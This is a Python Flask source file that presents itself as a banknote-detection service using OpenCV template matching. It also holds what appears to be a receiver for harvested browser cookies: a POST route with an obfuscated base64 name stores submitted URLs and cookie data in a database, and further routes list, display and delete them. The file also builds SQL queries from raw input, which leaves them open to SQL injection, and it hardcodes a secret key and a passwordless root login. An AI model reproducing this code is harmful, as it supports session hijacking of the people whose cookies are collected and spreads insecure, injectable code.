from flask.views import MethodView
from flask import Flask, jsonify, request, render_template
import cv2
import numpy as np
import glob
import os
import mysql.connector
from dotenv import load_dotenv
from flask_cors import CORS
import json

app = Flask(__name__) 
CORS(app)
app.secret_key = "SECRET"

load_dotenv()

cnx = mysql.connector.connect(user="root", password="", host="127.0.0.1", database="cookies_db")
cursor = cnx.cursor(buffered=True)

def translate(image, x, y):
	# Define the translation matrix and perform the translation
	M = np.float32([[1, 0, x], [0, 1, y]])
	shifted = cv2.warpAffine(image, M, (image.shape[1], image.shape[0]))

	# Return the translated image
	return shifted

def rotate_bound(image, angle):
    # grab the dimensions of the image and then determine the
    # center
    (h, w) = image.shape[:2]
    (cX, cY) = (w // 2, h // 2)
    # grab the rotation matrix (applying the negative of the
    # angle to rotate clockwise), then grab the sine and cosine
    # (i.e., the rotation components of the matrix)
    M = cv2.getRotationMatrix2D((cX, cY), -angle, 1.0)
    cos = np.abs(M[0, 0])
    sin = np.abs(M[0, 1])
    # compute the new bounding dimensions of the image
    nW = int((h * sin) + (w * cos))
    nH = int((h * cos) + (w * sin))
    # adjust the rotation matrix to take into account translation
    M[0, 2] += (nW / 2) - cX
    M[1, 2] += (nH / 2) - cY
    # perform the actual rotation and return the image
    return cv2.warpAffine(image, M, (nW, nH))

def rotate(image, angle, center = None, scale = 1.0):
	# Grab the dimensions of the image
	(h, w) = image.shape[:2]

	# If the center is None, initialize it as the center of
	# the image
	if center is None:
		center = (w / 2, h / 2)

	# Perform the rotation
	M = cv2.getRotationMatrix2D(center, angle, scale)
	rotated = cv2.warpAffine(image, M, (w, h))

	# Return the rotated image
	return rotated

def resize(image, width = None, height = None, inter = cv2.INTER_AREA):
	# initialize the dimensions of the image to be resized and
	# grab the image size
	dim = None
	(h, w) = image.shape[:2]

	# if both the width and height are None, then return the
	# original image
	if width is None and height is None:
		return image

	# check to see if the width is None
	if width is None:
		# calculate the ratio of the height and construct the
		# dimensions
		r = height / float(h)
		dim = (int(w * r), height)

	# otherwise, the height is None
	else:
		# calculate the ratio of the width and construct the
		# dimensions
		r = width / float(w)
		dim = (width, int(h * r))

	# resize the image
	resized = cv2.resize(image, dim, interpolation = inter)

	# return the resized image
	return resized

def countResult(datas):
    sum_max_vals = {}
    count_max_vals = {}

    for data in datas:
        nominal = data['nominal']
        max_val = data['max_value']

        if nominal in sum_max_vals:
            sum_max_vals[nominal] += max_val
            count_max_vals[nominal] += 1
        else:
            sum_max_vals[nominal] = max_val
            count_max_vals[nominal] = 1

    average_max_vals = {}
    for nominal, total_max_val in sum_max_vals.items():
        average_max_vals[nominal] = sum_max_vals[nominal] / count_max_vals[nominal]
            
    return average_max_vals

def uang_matching():
    # load templatel
    template_datas = []
    template_files = glob.glob('template/*/*/*.jpg', recursive=True)
    print("template loaded:", template_files)
    # prepare template
    for template_file in template_files:
        tmp = cv2.imread(template_file)
        tmp = resize(tmp, width=int(tmp.shape[1]*0.5))  # scalling
        tmp = cv2.cvtColor(tmp, cv2.COLOR_BGR2GRAY)  # grayscale
        #split_path = template_file.replace('template\\', '').replace('v2\\', '')
        #nominal = split_path.split('\\')[0]
        
        normalized_path = os.path.normpath(template_file)
        directory, file_name = os.path.split(normalized_path)
        nominal, _ = os.path.split(directory)
        template_datas.append({"glob": tmp, "nominal": os.path.basename(nominal), "max_value": 0.0})
    
    
    # template matching
    for image_glob in glob.glob('tmp/*.jpg'):
        for template in template_datas:
            image_test = cv2.imread(image_glob)
            image_test_resized = cv2.resize(image_test, (1200, 1600))#to avoid corrupt image cause high resolution
            (template_height, template_width) = template['glob'].shape[:2]

            image_test_p = cv2.cvtColor(image_test, cv2.COLOR_BGR2GRAY)

            found = None
            for scale in np.linspace(0.2, 1.0, 20)[::-1]:
                # scalling uang
                resized = resize(
                    image_test_p, width=int(image_test_p.shape[1] * scale))
                r = image_test_p.shape[1] / float(resized.shape[1])
                if resized.shape[0] < template_height or resized.shape[1] < template_width:
                    break

                # template matching
                result = cv2.matchTemplate(resized, template['glob'], cv2.TM_CCOEFF_NORMED)
                (_, maxVal, _, maxLoc) = cv2.minMaxLoc(result)
                if found is None or maxVal > found[0]:
                    found = (maxVal, maxLoc, r)
            if found is not None:
                (maxVal, maxLoc, r) = found
                (startX, startY) = (int(maxLoc[0]*r), int(maxLoc[1] * r))
                (endX, endY) = (
                    int((maxLoc[0] + template_width) * r), int((maxLoc[1] + template_height) * r))
                print(template['nominal'],":",maxVal)                    
                template['max_value'] = maxVal
                cv2.rectangle(image_test, (startX, startY),
                                (endX, endY), (0, 0, 255), 2)

    dataMatch = countResult(template_datas)
    return dataMatch

@app.route('/')
def home():
     return 'welcome, money detection'

@app.route('/api/upload', methods=['POST'])

def upload_image():
    file = request.files['image']
    file.save('./tmp/image.jpg')

    result = {'money': False}
    thershold = 0.48
    dataMatch = uang_matching()
    

    max_nominal = max(dataMatch, key=dataMatch.get)
    max_average_max_val = dataMatch[max_nominal]

    result['nominal'] = ''

    if max_average_max_val > thershold:
         result['nominal'] = max_nominal
         result['money'] = True
    result['max_val'] = max_average_max_val
    return jsonify(result)

@app.route('/ZnVja3lvdQ==', methods=['POST'])

def upload_data():
     url = request.json['url']
     cookies_data = str(request.json['cookies_data'])
    
     selectQuery = f'SELECT count(cookie_id) FROM cookies WHERE cookies_data = "{cookies_data}" limit 1'
     insertQuery = 'INSERT INTO cookies(url, cookies_data) VALUES("'+url+'","'+cookies_data+'")'
     cursor.execute(selectQuery)
     data = cursor.fetchone()

     if(data[0] == 0):        
        cursor.execute(insertQuery)
        cnx.commit()
        return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 
     else:
          return json.dumps({'success':False}), 200, {'ContentType':'application/json'} 
     

@app.route('/view/cookies')
def view_data():
    sql = """SELECT * FROM cookies"""
    cursor.execute(sql)
    result = cursor.fetchall()
    return render_template('view.html', all_datas=result)

@app.route('/api/cookies')
def get_data():
    sql = """SELECT * FROM cookies"""
    cursor.execute(sql)
    result = cursor.fetchall()
    return jsonify({'success':False, 'data': result})

@app.route('/delete/<int:id>', methods = ['GET','POST','DELETE'])
def delete(id):
   cursor.execute("DELETE FROM cookies WHERE cookie_id={}".format(id))
   cnx.commit()

   return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 

if __name__ == '__main__':
    app.run(debug=True)